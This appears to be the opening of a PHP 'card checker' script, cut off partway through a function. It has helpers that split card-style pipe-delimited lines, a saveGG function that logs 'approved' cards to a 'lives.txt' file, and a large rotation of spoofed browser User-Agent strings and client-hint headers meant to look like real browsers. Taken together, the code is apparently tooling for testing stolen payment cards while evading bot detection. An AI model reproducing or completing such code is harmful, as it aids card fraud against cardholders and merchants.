<?php
error_reporting(1);
function multiexplode($string)
{
    $delimiters = ["|", ";", ":", "/", "»", "«", ">", "<"];

    return explode(
        $delimiters[0],
        str_replace($delimiters, $delimiters[0], $string)
    );
}

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return "";
}

function saveGG($approvedCard) {

    file_put_contents('lives.txt', $approvedCard, FILE_APPEND);

  }


function colorir($text, $colorCode) {

    return "\e[{$colorCode}m$text\e[0m";

  }


    function randomNavegador()
    {
        $userAgents = [
            "opera" => [
                "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
                "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
                "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
                "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
                "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
                "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
                "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
                "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
                "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
                "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
                "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
                "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
                "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
                "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
                "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
                "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
                "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
                "Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
                "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
                "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
                "Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
                "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
                "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
                "Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
                "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
                "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
                "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
                "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
                "Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
                "Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
                "Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
                "Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
                "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
                "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
                "Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
                "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
                "Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
                "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
                "Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
                "Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
                "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
                "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
                "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
                "Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
                "Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
                "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
                "Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
                "Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
                "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
                "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
                "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
                "Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
                "Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
                "Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
                "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
                "Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
                "Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
                "Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
                "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
                "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
                "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
                "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
                "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
                "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
                "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
                "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
                "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
                "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
                "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
                "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
                "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
                "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
                "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
                "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
                "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
                "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
                "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
                "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
                "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
                "Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 6.0; U; de) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00",
                "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00",
            ],
            "chrome" => [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            ],
            "firefox" => [
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
                "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
                "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
                "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
                "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
                "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
                "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/19.0",
                "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/18.0.1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0",
                "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
                "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
                "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
                "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20120427 Firefox/15.0a1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
                "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2",
                "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:15.0) Gecko/20121011 Firefox/15.0.1",
            ],
            "edge" => [
                "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
                "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
                "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
                "Mozilla/5.0 ( ; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 7.1; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; AskTB5.5)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.2; .NET4.0C; .NET4.0E)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.3)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; FDM; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; InfoPath.3; .NET4.0E)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; FDM; .NET4.0C; .NET4.0E; chromeframe/11.0.696.57)",
                "Mozilla/4.0 (compatible; U; MSIE 9.0; WIndows NT 9.0; en-US)",
                "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
            ],
        ];

        $browser = array_rand($userAgents);
        $selectedUserAgent =
            $userAgents[$browser][array_rand($userAgents[$browser])];

        $secChUa =
            $browser === "opera"
                ? '"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"'
                : '"' .
                    $browser .
                    '";v="99", "' .
                    $browser .
                    '";v="121", "Chromium";v="121"';

        return [
            "User-Agent" => $selectedUserAgent,
